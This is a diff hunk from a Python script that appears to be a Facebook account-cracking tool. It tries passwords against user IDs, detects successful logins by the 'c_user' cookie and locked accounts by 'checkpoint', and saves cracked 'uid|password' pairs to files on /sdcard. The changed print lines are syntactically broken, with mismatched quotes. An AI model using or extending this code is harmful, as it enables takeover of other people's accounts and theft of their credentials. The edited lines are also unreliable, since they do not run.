@@ -1103,17 +1103,17 @@ def gxds_files(uid, pxss):
             ).text
             lxgin = session.cookies.get_dict().keys()
             if "c_user" in lxgin:
-                print(f"\r\r{lgr}  [GXDS-OK] {uid}:{ps}")
+                print('\r\r\033[1;32m  [GXDS-✓] '{uid}':'{ps}' - '+yxxr)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             elif "checkpoint" in lxgin:
-                print(f"\r\r{lr}  [GXDS-CP] {uid}:{ps}"+yxxr)
+                print('\r\r\033[1;31m  [GXDS-X] '{uid}':'{ps}' - '+yxxr)
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
             else:
-                print(f"\r\r{lr}  [GXDS-X] {uid}:{ps} - "+yxxr)
+                print('\r\r\033[1;31m  [GXDS-X] '{uid}':'{ps}' - '+yxxr)
                 continue
         loop += 1
     except requests.exceptions.ConnectionError:
